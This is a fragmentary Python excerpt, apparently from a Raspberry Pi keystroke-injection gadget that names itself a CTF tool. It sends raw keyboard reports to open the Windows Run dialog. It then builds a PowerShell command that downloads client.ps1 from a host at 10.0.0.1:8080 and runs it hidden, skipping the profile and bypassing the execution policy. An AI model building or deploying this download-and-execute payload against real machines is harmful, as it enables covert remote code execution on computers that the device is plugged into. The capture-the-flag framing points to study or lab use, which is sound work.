...
def start_http_server():
    os.chdir("/home/pi/CTF_Gadget")  # Correct the path
...
def run_cmd_and_check_os():
    # Press Windows + R
    write_report(chr(0x08) + NULL_CHAR + chr(0x15) + NULL_CHAR * 5)  # Windows + R
    ...
    ps_command = f"""
    Invoke-WebRequest -Uri http://10.0.0.1:8080/client.ps1 -OutFile $env:TEMP\\client.ps1;
    Start-Process powershell -ArgumentList "-NoProfile -NoLogo -WindowStyle Hidden -ExecutionPolicy Bypass -File $env:TEMP\client.ps1";
    """
